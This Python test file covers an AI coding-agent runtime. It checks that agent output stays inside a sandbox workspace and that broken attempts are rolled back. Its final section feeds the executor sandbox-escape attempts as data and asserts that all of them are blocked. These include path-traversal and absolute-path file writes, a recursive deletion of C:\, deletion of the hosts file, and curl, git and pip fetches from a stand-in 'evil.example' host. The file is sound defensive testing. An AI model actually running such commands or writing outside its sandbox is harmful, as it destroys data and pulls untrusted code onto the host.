from __future__ import annotations

import json
import subprocess
from pathlib import Path

import pytest

from app.agent.coder.executor import CodeExecutor
from app.agent.coder.workspace import Workspace
from app.agent.runtime import AgentRuntime
from app.context.builder import ContextBuilder
from app.sandbox.paths import PROJECT_ROOT

from helpers import (
    FakeLLM,
    RecordingCommandRunner,
)


def _docker_available() -> bool:
    try:
        completed = subprocess.run(
            [
                "docker",
                "info",
                "--format",
                "{{.ServerVersion}}",
            ],
            capture_output=True,
            text=True,
            timeout=20,
        )

    except (OSError, subprocess.SubprocessError):
        return False

    return completed.returncode == 0


DOCKER = _docker_available()


CALCULATOR = (
    "def add(a, b):\n"
    "    return a + b\n"
    "\n"
    "\n"
    "def subtract(a, b):\n"
    "    return a - b\n"
)

CALCULATOR_TEST = (
    "from sandbox_agent_test.calculator "
    "import add, subtract\n"
    "\n"
    "\n"
    "def test_add():\n"
    "    assert add(2, 3) == 5\n"
    "\n"
    "\n"
    "def test_subtract():\n"
    "    assert subtract(5, 2) == 3\n"
)


def _plan_responses() -> list[str]:
    goal = json.dumps(
        {
            "global_goal": (
                "Create sandbox_agent_test/calculator.py with "
                "add and subtract, plus pytest tests."
            ),
            "constraints": [
                "Files live under sandbox_agent_test/"
            ],
            "assumptions": ["pytest is available"],
            "success_criteria": [
                "calculator tests pass"
            ],
        },
        ensure_ascii=False,
    )

    tasks = json.dumps(
        {
            "tasks": [
                {
                    "key": "calculator",
                    "title": "Calculator module",
                    "description": (
                        "Create sandbox_agent_test/calculator.py "
                        "and sandbox_agent_test/test_calculator.py"
                    ),
                    "priority": 80,
                    "requires": [],
                    "produces": [
                        "sandbox_agent_test/calculator.py"
                    ],
                    "external_dependencies": [],
                    "success_criteria": [
                        "sandbox_agent_test/"
                        "test_calculator.py tests pass"
                    ],
                }
            ]
        },
        ensure_ascii=False,
    )

    dependencies = json.dumps(
        {"dependencies": {"calculator": []}}
    )

    return [goal, tasks, dependencies]


def _coder_envelope() -> str:
    return json.dumps(
        {
            "files": [
                {
                    "path": (
                        "sandbox_agent_test/__init__.py"
                    ),
                    "content": "",
                },
                {
                    "path": (
                        "sandbox_agent_test/calculator.py"
                    ),
                    "content": CALCULATOR,
                },
                {
                    "path": (
                        "sandbox_agent_test/"
                        "test_calculator.py"
                    ),
                    "content": CALCULATOR_TEST,
                },
            ],
            "commands": ["python -m pytest -q"],
        }
    )


@pytest.mark.skipif(
    not DOCKER,
    reason="Docker daemon is not running",
)
def test_e2e_calculator_creates_sandbox_only(tmp_path):
    host_project = tmp_path / "host_project"
    host_project.mkdir()
    (host_project / "README.md").write_text(
        "host project\n",
        encoding="utf-8",
    )

    llm = FakeLLM(
        _plan_responses(),
        default=_coder_envelope(),
    )

    runtime = AgentRuntime(
        project_root=host_project,
        database_path=tmp_path / "pc.db",
        llm=llm,
        load_policy=False,
    )

    state = runtime.run(
        "Создай папку sandbox_agent_test. В ней calculator.py с "
        "add(a,b) subtract(a,b). Создай pytest tests. Проверь обе "
        "функции."
    )

    assert state.phase.value == "DONE", (
        state.verification
    )

    # Files exist ONLY inside the sandbox workspace.
    sandbox_calc = (
        runtime.workspace_root
        / "sandbox_agent_test"
        / "calculator.py"
    )

    assert sandbox_calc.exists()

    assert not (
        host_project / "sandbox_agent_test"
    ).exists()

    assert not (
        PROJECT_ROOT / "sandbox_agent_test"
    ).exists()

    # A patch was produced and is not applied.
    assert state.patch_path is not None

    patch = Path(state.patch_path)

    assert patch.exists()

    contents = patch.read_text(encoding="utf-8")

    assert "calculator.py" in contents


# ==========================================
# E2E 2 - FAILURE -> ROLLBACK -> REPAIR -> PASS
# ==========================================


BROKEN_CALCULATOR = (
    "def add(a, b):\n"
    "    return a - b\n"
    "\n"
    "\n"
    "def subtract(a, b):\n"
    "    return a - b\n"
)


def _broken_envelope() -> str:
    return json.dumps(
        {
            "files": [
                {
                    "path": (
                        "sandbox_agent_test/__init__.py"
                    ),
                    "content": "",
                },
                {
                    "path": (
                        "sandbox_agent_test/calculator.py"
                    ),
                    "content": BROKEN_CALCULATOR,
                },
                {
                    "path": (
                        "sandbox_agent_test/"
                        "test_calculator.py"
                    ),
                    "content": CALCULATOR_TEST,
                },
            ],
            "commands": ["python -m pytest -q"],
        }
    )


@pytest.mark.skipif(
    not DOCKER,
    reason="Docker daemon is not running",
)
def test_e2e_repair_changes_approach_and_passes(
    tmp_path,
):
    host_project = tmp_path / "host_project"
    host_project.mkdir()
    (host_project / "README.md").write_text(
        "host project\n",
        encoding="utf-8",
    )

    llm = FakeLLM(
        _plan_responses()
        + [_broken_envelope(), _coder_envelope()]
    )

    runtime = AgentRuntime(
        project_root=host_project,
        database_path=tmp_path / "pc.db",
        llm=llm,
        load_policy=False,
    )

    state = runtime.run(
        "Создай sandbox_agent_test/calculator.py с add и "
        "subtract и pytest tests. Проверь функции."
    )

    assert state.phase.value == "DONE", (
        state.verification
    )

    # Attempt #1 failed, attempt #2 passed.
    task = runtime.plan_store.get_tasks(
        state.plan_id
    )[0]

    step = runtime.step_store.get_steps(task.id)[0]

    attempts = runtime.attempt_store.get_step_attempts(
        step.id
    )

    statuses = [a.status.value for a in attempts]

    assert "FAILED" in statuses or "BLOCKED" in statuses
    assert statuses[-1] == "PASS"
    assert len(attempts) >= 2

    # Attempt #1's broken code was rolled back: the sandbox now
    # contains the FIXED implementation only.
    calculator = (
        runtime.workspace_root
        / "sandbox_agent_test"
        / "calculator.py"
    )

    text = calculator.read_text(encoding="utf-8")

    assert "return a + b" in text

    # Host project untouched.
    assert not (
        host_project / "sandbox_agent_test"
    ).exists()

    assert state.patch_path is not None



# ==========================================
# E2E 3 - SECURITY ATTACK
# ==========================================


class _AttackTask:
    key = "attack"
    title = "Attack"
    description = "Attempt to escape."
    success_criteria = ["artifact.txt exists"]


_ATTACKS = (
    {
        "files": [{"path": r"C:\evil.txt", "content": "x"}],
        "commands": [],
    },
    {
        "files": [{"path": r"D:\evil.txt", "content": "x"}],
        "commands": [],
    },
    {
        "files": [{"path": r"F:\outside.txt", "content": "x"}],
        "commands": [],
    },
    {
        "files": [{"path": "../../evil.txt", "content": "x"}],
        "commands": [],
    },
    {
        "files": [{"path": r"\\server\share\evil.txt", "content": "x"}],
        "commands": [],
    },
    {
        "files": [],
        "commands": [
            r"powershell -Command Remove-Item C:\ -Recurse"
        ],
    },
    {
        "files": [],
        "commands": [
            r"cmd /c del C:\Windows\System32\drivers\etc\hosts"
        ],
    },
    {
        "files": [],
        "commands": ["pip install evilpkg"],
    },
    {
        "files": [],
        "commands": ["curl http://evil.example/payload"],
    },
    {
        "files": [],
        "commands": ["git clone http://evil.example/repo"],
    },
)


def test_e2e_security_attack_fully_blocked(tmp_path):
    workspace = Workspace(tmp_path)

    runner = RecordingCommandRunner()

    llm = FakeLLM(
        [
            json.dumps(attack)
            for attack in _ATTACKS
        ]
    )

    executor = CodeExecutor(
        workspace=workspace,
        llm=llm,
        context=ContextBuilder(
            project=workspace.project
        ),
        command_runner=runner,
    )

    results = [
        executor.execute(_AttackTask())
        for _ in _ATTACKS
    ]

    # Every attack is refused.
    assert all(
        result.ok is False
        for result in results
    )

    # No command ever reached the (injected) sandbox runner.
    assert runner.commands == []

    # No host files were created anywhere.
    assert not Path(r"C:\evil.txt").exists()
    assert not Path(r"D:\evil.txt").exists()
    assert not Path(r"F:\outside.txt").exists()
    assert not (tmp_path / "evil.txt").exists()
    assert not (tmp_path.parent / "evil.txt").exists()

